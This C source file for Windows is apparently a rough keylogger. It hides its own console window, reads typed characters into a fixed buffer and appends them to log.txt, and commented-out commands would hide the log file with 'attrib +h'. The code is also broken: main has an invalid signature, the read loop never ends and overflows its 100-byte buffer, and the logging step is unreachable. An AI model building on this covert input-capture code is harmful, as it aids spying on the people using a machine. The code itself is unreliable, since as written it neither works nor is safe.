#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <stdbool.h>

void KeySave();
void Hide();


int main(char *x){
 HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
	
	
char phrase[100];

	char letter;
	int i=0;
	bool answer=true;

//do{
	while(answer){
		letter=getchar();
		phrase[i]=letter;
		++i;
	
	
	
	
//}while(letter != '\n');
	phrase[i-1]='\0';
	x=phrase;
	}


	FILE *file;
	file=fopen("log.txt", "a+");
		fprintf(file,"%s\n",x);
	fclose(file);

return 0;
	}
	
	
	

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	void Hide(){
		HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
		
		
	}
	
	
	
	
	
	
	
	void KeySave(){
	

	char *x;
char phrase[100];

	char letter;
	int i=0;
	
do{
	letter=getchar();
	phrase[i]=letter;
	++i;
	}while(letter != '\n');
	phrase[i-1]='\0';
x=phrase;

	


	FILE *file;
	file=fopen("log.txt", "a+");
		fprintf(file,"%s\n",x);
	fclose(file);
		//system("if not exist log.txt (copy log.txt lo.txt) else()");
			//system("attrib +h lo.txt");
	
	}